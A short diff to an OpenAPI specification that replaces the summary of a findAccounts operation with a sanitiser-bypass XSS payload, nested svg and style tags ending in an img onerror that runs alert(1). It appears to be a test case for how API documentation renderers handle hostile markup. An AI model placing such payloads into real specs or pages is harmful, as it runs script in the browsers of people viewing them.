@@ -12,4 +12,4 @@ paths:
       tags:
         - accounts
       operationId: findAccounts
-      summary: Finds all accounts
+      summary: Finds all <svg><annotation-xml><foreignobject><style><!--</style><p id="--><img src='x' onerror='alert(1)'>">
